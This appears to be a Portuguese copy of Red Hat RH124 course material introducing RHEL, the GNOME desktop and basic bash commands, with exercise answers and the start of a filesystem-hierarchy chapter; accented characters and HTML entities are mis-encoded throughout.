Fedora Fedora √© um projeto comunit√°rio que produz e lan√ßa um sistema operacional completo, gratuito e baseado em Linux. A Red Hat patrocina a comunidade e trabalha com representantes da comunidade para integrar o mais recente software upstream a uma distribui√ß√£o r√°pida e segura. O projeto Fedora contribui com tudo de volta para o mundo open source livre, e qualquer pessoa pode participar.
No entanto, o Fedora se concentra na inova√ß√£o e na excel√™ncia, e n√£o na estabilidade de longo prazo. Novas atualiza√ß√µes importantes acontecem a cada seis meses e podem trazer mudan√ßas significativas. O Fedora √© compat√≠vel somente com lan√ßamentos por cerca de um ano (duas atualiza√ß√µes principais), o que o torna menos adequado para uso empresarial.
Red Hat Enterprise Linux O Red Hat Enterprise Linux (RHEL) √© a distribui√ß√£o do Linux da Red Hat pronta para empresas e com suporte comercial. √â a plataforma l√≠der para computa√ß√£o open source, n√£o apenas uma cole√ß√£o de projetos open source maduros. O RHEL √© extensivamente testado, tem um grande ecossistema de suporte de parceiros, certifica√ß√µes de hardware e software, servi√ßos de consultoria, treinamento e suporte de v√°rios anos e garantias de manuten√ß√£o.
A Red Hat baseia suas principais vers√µes do RHEL no Fedora. No entanto, em fun√ß√£o disso, a Red Hat pode escolher quais pacotes incluir, fazer outras melhorias (contribuiu com os projetos de upstream e Fedora) e tomar decis√µes de configura√ß√£o que atendam √†s necessidades dos clientes. A Red Hat ajuda os fornecedores e clientes a se envolverem com a comunidade de open source e a trabalhar com o desenvolvimento upstream para desenvolver solu√ß√µes e corrigir problemas.
O Red Hat Enterprise Linux usa um modelo de distribui√ß√£o baseado em subscri√ß√£o. Como este √© um software open source, esta n√£o √© uma taxa de licen√ßa. Em vez disso, ela paga o suporte, a manuten√ß√£o, as atualiza√ß√µes, patches de seguran√ßa, acesso √† base de conhecimento no Red Hat Customer Portal (http://access.redhat.com/), certifica√ß√µes e assim por diante. O cliente est√° pagando por suporte e expertise de longo prazo, comprometimento e assist√™ncia quando necess√°rio.
Quando grandes atualiza√ß√µes s√£o disponibilizadas, os clientes podem implement√°-las quando for mais conveniente para eles e sem pagar mais. Isso simplifica o gerenciamento das atualiza√ß√µes de sistema nos aspectos econ√¥mico e pr√°tico.
CentOS O CentOS √© uma distribui√ß√£o Linux orientada pela comunidade e derivada em grande parte da base de c√≥digo open source da Red Hat Enterprise Linux e outras fontes. √â gratuito, f√°cil de instalar e conta com equipe e suporte de uma comunidade ativa de volunt√°rios que opera independentemente da Red Hat.
Introdu√ß√£o ao ambiente GNOME de √°rea de trabalho O ambiente de desktop √© a interface gr√°fica do usu√°rio em um sistema Linux. O ambiente de √°rea de trabalho padr√£o no Red Hat Enterprise Linux 8 √© fornecido pelo GNOME 3. Ele fornece aos usu√°rios uma √°rea de trabalho integrada, al√©m de uma plataforma de desenvolvimento unificada fornecida pelo Wayland (por padr√£o) ou pelo X Window System legado.
O GNOME Shell oferece as principais fun√ß√µes de interface de usu√°rio do ambiente GNOME de √°rea de trabalho. O aplicativo GNOME Shell √© altamente personaliz√°vel. O padr√£o do Red Hat Enterprise Linux 8 para a apar√™ncia do GNOME Shell √© o tema &amp;ldquo;Padr√£o&amp;rdquo;, que √© usado nesta se√ß√£o. O padr√£o do Red Hat Enterprise Linux 7 era um tema alternativo chamado &amp;ldquo;Cl√°ssico&amp;rdquo;, que estava mais perto da apar√™ncia de vers√µes mais antigas do GNOME. O tema pode ser selecionado de modo persistente no login, clicando o √≠cone de engrenagem ao lado do bot√£o Sign In depois de selecionar a conta e antes de digitar a senha.
Partes do GNOME Shell Os elementos do GNOME Shell incluem as seguintes partes, conforme ilustrado por esta captura de tela do GNOME Shell no modo de vis√£o geral Activities:
Barra superior: a barra que fica no topo da tela. Ela √© exibido na vis√£o geral Activities e nos espa√ßos de trabalho. A barra superior oferece o bot√£o Activities, al√©m dos controles de volume, rede, acesso ao calend√°rio e a altern√¢ncia entre os m√©todos de entrada de teclado (se mais de uma estiver configurada).
Activities overview: este √© um modo especial que ajuda um usu√°rio a organizar janelas e iniciar aplicativos. A vis√£o geral Activities pode ser inserida clicando no bot√£o Activities no canto superior esquerdo da barra superior ou pressionando a tecla Super. A tecla Super (√†s vezes chamada de tecla do Windows ou a tecla Command), fica perto do canto inferior esquerdo de um PC IBM de 104/105 teclas ou de um teclado Apple. As tr√™s √°reas principais da vis√£o geral Activities s√£o o dash, √† esquerda da tela, a windows overview, no centro da tela, e o workspace selector, no lado direito da tela.
System menu: o menu no canto superior direito na barra superior fornece controle para ajustar o brilho da tela e para ativar ou desativar as conex√µes de rede. Abaixo do submenu do nome de usu√°rio est√£o as op√ß√µes para ajustar das configura√ß√µes de conta e fazer o logout do sistema ou desligar. O menu do sistema tamb√©m oferece bot√µes para abrir a janela Settings, bloquear a tela ou desligar o sistema.
Dash: √© uma lista configur√°vel de √≠cones dos aplicativos favoritos do usu√°rio, dos aplicativos que est√£o em execu√ß√£o e um bot√£o de grid na parte inferior do dash que pode ser usado para selecionar aplicativos arbitr√°rios. Voc√™ pode iniciar os aplicativos clicando em um dos √≠cones ou usando a grade para encontrar um aplicativo menos usado. O dash tamb√©m √©, √†s vezes, chamado de dock.
Windows overview: uma √°rea no centro da vis√£o geral Activities, que exibe miniaturas de todas as janelas ativas na √°rea de trabalho atual. Isso permite que as janelas sejam mais facilmente colocadas em primeiro plano em um espa√ßo de trabalho desordenado ou movidas para outro espa√ßo de trabalho.
Workspace selector: uma √°rea √† direita da vis√£o geral Activities, que exibe miniaturas de todas as √°reas de trabalho ativas e permite que as √°reas de trabalho sejam selecionadas e as janelas sejam movidas de uma √°rea de trabalho para outra.
Bandeja de mensagens: oferece uma maneira de acessar as notifica√ß√µes enviadas por aplicativos ou componentes do sistema ao GNOME. Se uma notifica√ß√£o ocorrer, normalmente, ela ser√° exibida primeiro brevemente como uma √∫nica linha na parte superior da tela e um indicador persistente aparecer√° no centro da barra superior ao lado do rel√≥gio para informar o usu√°rio sobre as notifica√ß√µes que foram recebidas recentemente. Voc√™ pode abrir a bandeja de mensagens para analisar essas notifica√ß√µes clicando no rel√≥gio na barra superior ou pressionando Super&#43;m. Voc√™ pode fechar a bandeja de mensagens clicando no rel√≥gio na barra superior ou pressionando Esc ou Super&#43;M novamente.
Voc√™ pode visualizar e editar os atalhos de teclado do GNOME usados por sua conta. Abra o menu do sistema no lado direito da barra superior. Clique no bot√£o Settings na parte inferior do menu √† esquerda. Na janela do aplicativo que √© aberta, selecione Devices ‚Üí Keyborad no painel esquerdo. O painel direito exibir√° suas configura√ß√µes de atalho atuais.
Nota Pode ser dif√≠cil enviar alguns atalhos de teclado, como as teclas de fun√ß√£o ou a tecla Super, para uma m√°quina virtual. Isso ocorre porque as teclas especiais usadas por esses atalhos podem ser capturadas pelo sistema operacional local ou pelo aplicativo que voc√™ est√° usando para acessar a √°rea de trabalho gr√°fica de sua m√°quina virtual.
Importante Nos ambientes de treinamento virtual e individualizado atuais da Red Hat, usar a tecla Super pode ser um pouco complicado. Voc√™ provavelmente n√£o poder√° usar a tecla Super do teclado porque ela, muitas vezes, n√£o √© passada para a m√°quina virtual no ambiente de sala de aula pelo seu navegador da web.
Na parte superior da janela do navegador que exibe a interface da sua m√°quina virtual, deve haver um √≠cone de teclado no lado direito. Se voc√™ clicar nele, ser√° aberto um teclado na tela. Clicando novamente, o teclado na tela ser√° fechado.
O teclado na tela trata a Super como uma tecla modificadora que √© frequentemente pressionada com outra tecla. Se voc√™ clicar nela uma vez, ela ficar√° amarela, indicando que est√° sendo pressionada. Ent√£o, para pressionar Super&#43;M no teclado na tela, clique em Super e em M.
Se voc√™ desejar apenas pressionar e soltar Super no teclado na tela, dever√° clicar duas vezes nela. O primeiro clique mant√©m a tecla Super pressionada, e o segundo clique a libera.
As outras teclas tratadas como teclas modificadoras (como a Super) pelo teclado na tela s√£o Shift, Ctrl, Alt e Caps. As teclas Esc e Menu s√£o tratadas como teclas normais e n√£o como teclas modificadoras.
Espa√ßos de trabalho Os espa√ßos de trabalho s√£o telas separadas que t√™m janelas de aplicativo diferentes. Eles podem ser usados para organizar seu ambiente de trabalho agrupando janelas de aplicativo abertas por tarefas. Por exemplo, janelas usadas para executar uma determinada atividade de manuten√ß√£o do sistema (como a configura√ß√£o de um novo servidor remoto) podem ser agrupadas em um espa√ßo de trabalho, enquanto e-mails e outros aplicativos de comunica√ß√£o podem ser agrupados em outro espa√ßo de trabalho.
H√° dois m√©todos simples para alternar entre espa√ßos de trabalho. um m√©todo, talvez o mais r√°pido, √© pressionar Ctrl&#43;Alt&#43;seta para cima ou Ctrl&#43;Alt&#43;seta para baixo para alternar entre espa√ßos de trabalho em sequ√™ncia. O segundo √© alternar para a vis√£o geral Activities desejada e clicar no espa√ßo de trabalho.
Uma vantagem de usar a vis√£o geral Activities √© que as janelas podem ser clicadas e arrastadas entre o espa√ßo de trabalho usando o workspace selector √† direita da tela, e a windows overview, no centro da tela.
Importante Assim como a Super, nos ambientes atuais de treinamento virtual e individualizado da Red Hat, as combina√ß√µes de teclas Ctrl&#43;Alt n√£o s√£o geralmente passadas para a m√°quina virtual no ambiente de sala de aula pelo seu navegador da web.
Voc√™ pode inserir essas combina√ß√µes de teclas para alternar espa√ßos de trabalho usando o teclado na tela. Pelo menos dois espa√ßos de trabalho precisam estar em uso. Abra o teclado na tela e clique em Ctrl, Alt e, em seguida, na seta para cima ou na seta para baixo.
No entanto, nesses ambientes de treinamento, geralmente √© mais simples evitar os atalhos de teclado e o teclado na tela. Alterne espa√ßos de trabalho clicando no bot√£o Activities e, em seguida, no seletor de √°rea de trabalho √† direita da vis√£o geral Activities, clicando no espa√ßo de trabalho para o qual voc√™ deseja alternar.
Inicializa√ß√£o de um terminal Para obter um prompt do shell no GNOME, inicie um aplicativo de terminal gr√°fico, como o GNOME Terminal. H√° v√°rias maneiras de fazer isso. Os dois m√©todos mais usados est√£o listados abaixo:
Na vis√£o geral Activities, selecione Terminal no dash (na √°rea dos favoritos, encontrando-o com o bot√£o de grade (no agrupamento Utilities) ou usando o campo de pesquisa na parte superior da windows overview).
Pressione a combina√ß√£o de teclas Alt&#43;F2 para abrir Enter a Command e digite gnome-terminal.
Quando uma janela de terminal for aberta, um prompt do shell ser√° exibido ao usu√°rio que iniciou o programa de terminal gr√°fico. O prompt do shell e a barra de t√≠tulo da janela de terminal indicam o nome de usu√°rio atual, o nome do host e o diret√≥rio de trabalho.
Bloqueio de tela ou logout √â poss√≠vel bloquear a tela ou fazer o logout totalmente a partir do menu de sistema no lado direito da barra superior.
Para bloquear a tela, no menu do sistema no canto superior direito, clique no bot√£o de bloqueio na parte inferior do menu ou pressione Super&#43;L (que pode ser mais f√°cil de lembrar como Windows&#43;L). A tela tamb√©m √© bloqueada se a sess√£o gr√°fica ficar inativa por alguns minutos.
Uma lock screen curtain (cortina de tela de bloqueio) aparece, mostrando a hora do sistema e o nome do usu√°rio conectado. Para desbloquear a tela, pressione Enter ou espa√ßo para levantar a cortina de bloqueio de tela; em seguida, insira a senha do usu√°rio na tela de bloqueio.
Para fazer o logout e finalizar a sess√£o de login gr√°fico atual, selecione o menu do sistema no canto superior direito da barra superior e clique em (User) ‚Üí Log Out. Uma janela √© exibida, oferecendo a op√ß√£o de Cancel ou confirmar a a√ß√£o Log out.
Desligamento ou reinicializa√ß√£o do sistema Para desligar o sistema, no menu do sistema no canto superior direito, clique no bot√£o liga/desliga na parte inferior do menu ou pressione Ctrl&#43;Alt&#43;Del. Na caixa de di√°logo exibida, voc√™ pode escolher Power Off (Desligar) ou Restart (Reiniciar) a m√°quina; ou Cancel (Cancelar) a opera√ß√£o. Se voc√™ n√£o fizer uma escolha, o sistema ser√° desligado automaticamente ap√≥s 60 segundos.
Sintaxe b√°sica de comandos O GNU Bourne-Again Shell (bash) √© um programa que interpreta comandos digitados pelo usu√°rio. Cada string digitada no shell pode ter at√© tr√™s partes: o comando, as op√ß√µes (que geralmente come√ßam com - ou &amp;ndash;) e os argumentos. Cada palavra digitada no shell √© separada por espa√ßos. Comandos s√£o os nomes dos programas que est√£o instalados no sistema. Cada comando tem suas pr√≥prias op√ß√µes e argumentos.
Quando estiver pronto para executar um comando, pressione a tecla Enter. Digite cada comando em uma linha separada. A sa√≠da do comando √© exibida antes que o pr√≥ximo prompt do shell seja exibido.
[user@host]$ whoami user [user@host]$ Se quiser digitar mais de um comando em uma √∫nica linha, use um ponto e v√≠rgula (;) como separador de comandos. Um ponto e v√≠rgula √© um membro de uma classe de caracteres chamada metacaracteres que tem significados especiais para o bash. Nesse caso, a sa√≠da de ambos os comandos ser√° exibida antes de o pr√≥ximo prompt shell aparecer.
O exemplo a seguir mostra como combinar dois comandos (command1 e command2) na linha de comando.
[user@host]$ command1;command2 Exemplos de comandos simples O comando date mostra a data e a hora atuais. Ele tamb√©m pode ser usado pelo superusu√°rio para ajustar o rel√≥gio do sistema. Um argumento que come√ßa por um sinal de mais (&#43;) define a string de formata√ß√£o para o comando date.
[user@host ~]$ date Sat Jan 26 08:13:50 IST 2019 [user@host ~]$ date &#43;%R 08:13 [user@host ~]$ date &#43;%x 01/26/2019 O comando passwd altera a senha do pr√≥prio usu√°rio. A senha original da conta dever√° ser indicada para que uma altera√ß√£o seja permitida. Por padr√£o, passwd est√° configurado para solicitar uma senha segura, composta por letras min√∫sculas, mai√∫sculas, n√∫meros e s√≠mbolos e que n√£o seja baseada em uma palavra do dicion√°rio. O superusu√°rio pode usar o comando passwd para alterar as senhas de outros usu√°rios.
[user@host ~]$ passwd Changing password for user user. Current password: old_password New password: new_password Retype new password: new_password passwd: all authentication tokens updated successfully. O Linux n√£o exige extens√µes de nome de arquivo para classificar arquivos por tipo. O comando file varre o in√≠cio do conte√∫do de um arquivo e exibe seu tipo. Os arquivos a serem classificados ser√£o passados como argumentos ao comando.
[user@host ~]$ file /etc/passwd /etc/passwd: ASCII text [user@host ~]$ file /bin/passwd /bin/passwd: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a3637110e27e9a48dced9f38b4ae43388d32d0e4, stripped [user@host ~]$ file /home /home: directory Visualiza√ß√£o do conte√∫do dos arquivos Um dos comandos mais simples e frequentemente usados no Linux √© o cat. O comando cat permite criar m√∫ltiplos arquivos ou arquivos √∫nicos, visualizar o conte√∫do dos arquivos, concatenar o conte√∫do de v√°rios arquivos e redirecionar o conte√∫do do arquivo a um terminal ou a arquivos.
O exemplo mostra como visualizar o conte√∫do do arquivo /etc/passwd.
[user@host ~]$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin ...output omitted... Use o comando a seguir para exibir o conte√∫do de v√°rios arquivos.
[user@host ~]$ cat file1 file2 Hello World!! Introduction to Linux commands. Alguns arquivos s√£o muito longos e podem ocupar mais espa√ßo para serem exibidos do que o fornecido pelo terminal. O comando cat n√£o exibe o conte√∫do de um arquivo como p√°ginas. O comando less exibe uma p√°gina de um arquivo de cada vez e permite que voc√™ percorra as p√°ginas.
O comando less permite que voc√™ avance e volte nas p√°ginas por meio de arquivos mais compridos que cabem em uma janela de terminal. Use as teclas de seta para cima e seta para baixo para rolar para cima e para baixo. Pressione q para sair do comando.
Os comandos head e tail exibem o in√≠cio e o fim de um arquivo, respectivamente. Por padr√£o, esses comandos exibem 10 linhas do arquivo, mas ambos t√™m uma op√ß√£o -n que permite especificar um n√∫mero diferente de linhas. O arquivo a ser exibido ser√° passado como um argumento para esses comandos.
[user@host ~]$ head /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin [user@host ~]$ tail -n 3 /etc/passwd gdm:x:42:42::/var/lib/gdm:/sbin/nologin gnome-initial-setup:x:977:977::/run/gnome-initial-setup/:/sbin/nologin avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin O comando wc conta linhas, palavras e caracteres em um arquivo. √â preciso de uma op√ß√£o -l, -w ou -c para exibir apenas linhas, palavras ou caracteres, respectivamente.
[user@host ~]$ wc /etc/passwd 45 102 2480 /etc/passwd [user@host ~]$ wc -l /etc/passwd ; wc -l /etc/group 45 /etc/passwd 70 /etc/group [user@host ~]$ wc -c /etc/group /etc/hosts 966 /etc/group 516 /etc/hosts 1482 total Preenchimento com Tab O preenchimento com Tab permite que o usu√°rio complete comandos ou nomes de arquivo rapidamente depois de digitar uma parte suficiente no prompt para torn√°-los exclusivos. Se os caracteres digitados n√£o forem √∫nicos, pressionar a tecla Tab duas vezes mostra todos os comandos iniciados pelos caracteres j√° digitados.
[user@host ~]$ pas1Tab&#43;Tab passwd paste pasuspender [user@host ~]$ pass2Tab [user@host ~]$ passwd Changing password for user user. Current password: 1 Pressione Tab duas vezes.
2 Pressione Tab uma vez.
O preenchimento com Tab pode ser usado para completar os nomes de arquivo ao digit√°-los como argumentos de comandos. Quando a tecla Tab √© pressionada, ela preenche o nome do arquivo, tanto quanto poss√≠vel. Pressionar Tab uma segunda vez far√° com que o shell liste todos os arquivos que correspondam ao padr√£o atual. Digite caracteres adicionais at√© o nome ser exclusivo e use o preenchimento com Tab para completar o comando.
[user@host ~]$ ls /etc/pas1Tab [user@host ~]$ ls /etc/passwd2Tab passwd passwd- 1 2 Pressione Tab uma vez.
√â poss√≠vel corresponder argumentos e op√ß√µes usando o preenchimento com Tab para muitos comandos. O comando useradd √© usado pelo superusu√°rio, root, para criar usu√°rios adicionais no sistema. Muitas op√ß√µes podem ser usadas para controlar como esse comando se comporta. O preenchimento com Tab ap√≥s uma op√ß√£o parcial pode ser utilizado para concluir a op√ß√£o sem precisar digitar muito.
[root@host ~]## useradd --1Tab&#43;Tab --base-dir --groups --no-log-init --shell --comment --help --non-unique --skel --create-home --home-dir --no-user-group --system --defaults --inactive --password --uid --expiredate --key --root --user-group --gid --no-create-home --selinux-user [root@host ~]## useradd -- 1 Pressione Tab duas vezes.
Continua√ß√£o de um longo comando em outra linha Comandos com muitas op√ß√µes e argumentos podem rapidamente se tornar longos e s√£o automaticamente envolvidos pela janela de comando quando o cursor atinge a margem direita. Em vez disso, para facilitar a legibilidade do comando, voc√™ pode digitar um comando longo usando mais de uma linha.
Para fazer isso, voc√™ usar√° um caractere de barra invertida (), referido como o caractere escape, para ignorar o significado do caractere imediatamente ap√≥s a barra invertida. Voc√™ aprendeu que inserir um caractere de nova linha, pressionando a tecla Enter, informa ao shell que a entrada do comando est√° completa e que o comando deve ser executado. Ao usar o escape para o caractere de nova linha, o shell √© instru√≠do a mudar para uma nova linha de comando sem o executar. O shell reconhece a solicita√ß√£o exibindo um prompt de continua√ß√£o, chamado de prompt secund√°rio, usando o caractere maior do que (&amp;gt;) por padr√£o em uma nova linha vazia. Os comandos podem ser continuados em muitas linhas.
[user@host]$ head -n 3 \ &amp;gt; /usr/share/dict/words \ &amp;gt; /usr/share/dict/linux.words ==&amp;gt; /usr/share/dict/words &amp;lt;== 1080 10-point 10th ==&amp;gt; /usr/share/dict/linux.words &amp;lt;== 1080 10-point 10th [user@host ~]$ Importante O exemplo de tela anterior mostra como um comando continuado aparece para um usu√°rio t√≠pico. No entanto, promover esse realismo em materiais did√°ticos, como este livro, geralmente causa confus√£o. Os novos alunos podem inserir por engano o caractere maior do que adicional como parte do comando digitado. O shell interpreta um caractere maior do que digitado como redirecionamento de processo, o que n√£o era o objetivo do usu√°rio. O redirecionamento de processos √© discutido em um pr√≥ximo cap√≠tulo.
Para evitar essa confus√£o, este livro n√£o mostrar√° prompts secund√°rios nas sa√≠das da tela. Um usu√°rio ainda ver√° o prompt secund√°rio em sua janela do shell, mas o material do curso exibe intencionalmente apenas caracteres para serem digitados, conforme demonstrado no exemplo abaixo. Compare com o exemplo de tela anterior.
[user@host]$ head -n 3 \ /usr/share/dict/words \ /usr/share/dict/linux.words ==&amp;gt; /usr/share/dict/words &amp;lt;== 1080 10-point 10th ==&amp;gt; /usr/share/dict/linux.words &amp;lt;== 1080 10-point 10th [user@host ~]$ Hist√≥rico de comandos O comando history exibe uma lista de comandos executados anteriormente precedidos por um n√∫mero.
O caractere ponto de exclama√ß√£o (!) √© um metacaractere usado para expandir comandos anteriores sem precisar redigit√°-los. O comando !number expande o comando que corresponde ao n√∫mero indicado. O comando !string expande o comando mais recente que come√ßa com a string especificada.
[user@host ~]$ history ...output omitted... 23 clear 24 who 25 pwd 26 ls /etc 27 uptime 28 ls -l 29 date 30 history [user@host ~]$ !ls ls -l total 0 drwxr-xr-x. 2 user user 6 Mar 29 21:16 Desktop ...output omitted... [user@host ~]$ !26 ls /etc abrt hosts pulse adjtime hosts.allow purple aliases hosts.deny qemu-ga ...output omitted... As teclas de seta podem ser usadas para navegar pelos comandos anteriores no hist√≥rico do shell. A seta para cima edita o comando anterior na lista do hist√≥rico. A seta para baixo edita o pr√≥ximo comando na lista do hist√≥rico. A seta para a esquerda e a seta para a direita movem o cursor para a esquerda e para a direita no comando atual da lista de hist√≥rico, para que voc√™ possa edit√°-lo antes de execut√°-lo.
Voc√™ pode usar a combina√ß√£o de teclas Esc&#43;. ou Alt&#43;. para inserir a √∫ltima palavra do comando anterior na localiza√ß√£o atual do cursor. O uso repetido da combina√ß√£o de teclas substituir√° esse texto pela √∫ltima palavra dos comandos anteriores do hist√≥rico. A combina√ß√£o de teclas Alt&#43;. √© particularmente conveniente porque voc√™ pode segurar Alt e pressionar . repetidamente para percorrer facilmente pelos comandos anteriores.
Edi√ß√£o da linha de comando Quando usado de forma interativa, bash tem um recurso de edi√ß√£o de linha de comando. Isso permite que o usu√°rio utilize os comandos do editor de texto para se mover e modificar o comando atual sendo digitado. O movimento no comando atual e a passagem pelo hist√≥rico de comandos usando as teclas de seta foram introduzidos anteriormente nesta sess√£o. Comandos de edi√ß√£o mais poderosos s√£o apresentados na tabela a seguir.
Atalho = Descri√ß√£o
Ctrl&#43;A =&amp;gt; Ir para o in√≠cio da linha de comando.
Ctrl&#43;E =&amp;gt; Ir para o final da linha de comando.
Ctrl&#43;U =&amp;gt; Limpar do cursor ao in√≠cio da linha de comando.
Ctrl&#43;K =&amp;gt; Limpar do cursor at√© o final da linha de comando.
Ctrl&#43;seta =&amp;gt; para a esquerda Ir para o in√≠cio da palavra anterior na linha de comando.
Ctrl&#43;seta =&amp;gt; para a direita Ir para o final da pr√≥xima palavra na linha de comando.
Ctrl&#43;R =&amp;gt; Pesquisar um padr√£o na lista de hist√≥rico de comandos.
H√° v√°rios outros comandos de edi√ß√£o de linha de comando dispon√≠veis, mas esses s√£o os comandos mais √∫teis para novos usu√°rios. Os outros comandos podem ser encontrados na p√°gina do man bash
Use o comando date para exibir a data e a hora atuais [student@workstation ~]$ date Thu Jan 22 10:13:04 PDT 2019 Mostrar a hora atual no formato de 12 horas (por exemplo, 11:42:11 AM). Dica: a string de formato que exibe a sa√≠da √© %r. [student@workstation ~]$ date &#43;%r 10:14:07 AM Qual tipo de arquivo √© /home/student/zcat? Ele √© leg√≠vel? ‚ûú ~ file /usr/bin/zcat /usr/bin/zcat: POSIX shell script, ASCII text executable Use o comando wc e os atalhos do Bash para exibir o tamanho de zcat. ‚ûú ~ wc /usr/bin/zcat 51 299 1984 /usr/bin/zcat Exiba as 10 primeiras linhas de zcat. ‚ûú ~ head h10 /usr/bin/zcat head: n√£o foi poss√≠vel abrir &amp;#39;h10&amp;#39; para leitura: Arquivo ou diret√≥rio inexistente ==&amp;gt; /usr/bin/zcat &amp;lt;== #!/bin/sh # Uncompress files to standard output. # Copyright (C) 2007, 2010-2018 Free Software Foundation, Inc. # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 3 of the License, or # (at your option) any later version. Exiba as 10 √∫ltimas linhas do arquivo zcat. ‚ûú ~ tail -n 10 /usr/bin/zcat With no FILE, or when FILE is -, read standard input. Report bugs to &amp;lt;bug-gzip@gnu.org&amp;gt;.&amp;#34; case $1 in --help) printf &amp;#39;%s\n&amp;#39; &amp;#34;$usage&amp;#34; || exit 1; exit;; --version) printf &amp;#39;%s\n&amp;#39; &amp;#34;$version&amp;#34; || exit 1; exit;; esac exec gzip -cd &amp;#34;$@&amp;#34; Repita o comando anterior exato pressionando as teclas tr√™s vezes ou menos. Repita o comando anterior exato. Pressione a tecla de seta para cima uma vez para voltar no hist√≥rico do comando e pressione Enter (duas vezes), ou digite o comando de atalho !! e, depois, pressione Enter (tr√™s vezes) para executar o comando mais recente no hist√≥rico de comandos. (Tente usar ambos.)
[student@workstation]$ !! tail zcat With no FILE, or when FILE is -, read standard input. Report bugs to &amp;lt;bug-gzip@gnu.org&amp;gt;.&amp;#34; case $1 in --help) printf &amp;#39;%s\n&amp;#39; &amp;#34;$usage&amp;#34; || exit 1;; --version) printf &amp;#39;%s\n&amp;#39; &amp;#34;$version&amp;#34; || exit 1;; esac exec gzip -cd &amp;#34;$@&amp;#34; Repita o comando anterior, mas use a op√ß√£o -n 20 para exibir as √∫ltimas 20 linhas no arquivo. Use a edi√ß√£o de linha de comando para fazer isso com o m√≠nimo de pressionamento de teclas. ‚ûú ~ tail -n 20 /usr/bin/zcat -l, --list list compressed file contents -q, --quiet suppress all warnings -r, --recursive operate recursively on directories -S, --suffix=SUF use suffix SUF on compressed files --synchronous synchronous output (safer if system crashes, but slower) -t, --test test compressed file integrity -v, --verbose verbose mode --help display this help and exit --version display version information and exit With no FILE, or when FILE is -, read standard input. Report bugs to &amp;lt;bug-gzip@gnu.org&amp;gt;.&amp;#34; case $1 in --help) printf &amp;#39;%s\n&amp;#39; &amp;#34;$usage&amp;#34; || exit 1; exit;; --version) printf &amp;#39;%s\n&amp;#39; &amp;#34;$version&amp;#34; || exit 1; exit;; esac exec gzip -cd &amp;#34;$@&amp;#34; Use o hist√≥rico do shell para executar o comando date &#43;%r novamente. [student@workstation ~]$ history 1 date 2 date &#43;%r 3 file zcat 4 wc zcat 5 head zcat 6 tail zcat 7 tail -n 20 zcat 8 history [student@workstation ~]$ !2 date &#43;%r 10:49:56 AM =&amp;gt; O shell Bash √© um interpretador de comandos que solicita aos usu√°rios interativos que especifiquem os comandos do Linux.
=&amp;gt; Muitos comandos t√™m uma op√ß√£o &amp;ndash;help que exibe uma tela ou mensagem de uso.
=&amp;gt; A utiliza√ß√£o de espa√ßos de trabalho facilita a organiza√ß√£o de v√°rias janelas de aplicativos.
=&amp;gt; O bot√£o Activities no canto superior esquerdo da barra superior fornece um modo de vis√£o geral que ajuda o usu√°rio a organizar janelas e iniciar aplicativos.
=&amp;gt; O comando file varre o in√≠cio do conte√∫do de um arquivo e exibe seu tipo.
=&amp;gt; Os comandos head e tail exibem o in√≠cio e o fim de um arquivo, respectivamente.
=&amp;gt; Voc√™ pode usar o preenchimento Tab para preencher nomes de arquivos ao digit√°-los como argumentos para os comandos.
https://rha.ole.redhat.com/rha/app/courses/rh124-8.2/pages/ch03
Cap√≠tulo 3. Gerenciamento de arquivos na linha de comando A hierarquia do sistema de arquivos
Todos os arquivos em um sistema Linux s√£o armazenados em sistemas de arquivos, que s√£o organizados em uma √∫nica √°rvore de diret√≥rio invertida, conhecida como hierarquia do sistema de arquivos. Essa √°rvore √© invertida porque dizemos que a raiz dela est√° na parte superior da hierarquia e os ramos de diret√≥rios e subdiret√≥rios se estendem abaixo da raiz (root).
O diret√≥rio / √© o diret√≥rio root no topo da hierarquia do sistema de arquivos. O caractere / tamb√©m √© usado como separador de diret√≥rios nos nomes de arquivos. Por exemplo, se etc for um subdiret√≥rio do diret√≥rio /, √© poss√≠vel cham√°-lo de /etc. Do mesmo modo, se o diret√≥rio /etc contiver um arquivo chamado issue, √© poss√≠vel referir-se ao arquivo como /etc/issue.
Os subdiret√≥rios de / s√£o usados com fins padronizados para organizar arquivos por tipo e finalidade. Assim, fica mais f√°cil encontrar arquivos. Por exemplo, no diret√≥rio root, o subdiret√≥rio /boot √© utilizado para armazenar os arquivos necess√°rios para o boot do sistema.
Nota Os seguintes termos ajudam a descrever o conte√∫do do diret√≥rio do sistema de arquivos:
=&amp;gt; O conte√∫do est√°tico permanece inalterado at√© que seja editado ou reconfigurado.
=&amp;gt; O conte√∫do din√¢mico ou vari√°vel pode ser modificado ou inserido pelos processos ativos.
=&amp;gt; O conte√∫do persistente permanece ap√≥s uma reinicializa√ß√£o, como defini√ß√µes de configura√ß√£o.
=&amp;gt; O conte√∫do de tempo de execu√ß√£o √© espec√≠fico de processos ou sistemas e √© exclu√≠do por uma reinicializa√ß√£o.
Diret√≥rios importantes do Red Hat Enterprise Linux /usr
Software instalado, bibliotecas compartilhadas, arquivos inclu√≠dos e dados de programas somente leitura. Subdiret√≥rios importantes incluem: /usr/bin: comandos de usu√°rio. /usr/sbin: comandos de administra√ß√£o do sistema. /usr/local: software personalizado localmente. /etc
Arquivos de configura√ß√£o espec√≠ficos deste sistema. /var
Dados vari√°veis espec√≠ficos deste sistema que devem persistir entre boots do sistema. Os arquivos que mudam de modo din√¢mico; por exemplo, bancos de dados, diret√≥rios de cache, arquivos de log, documentos com spool de impressora e conte√∫do de sites podem ser encontrados em /var. /run
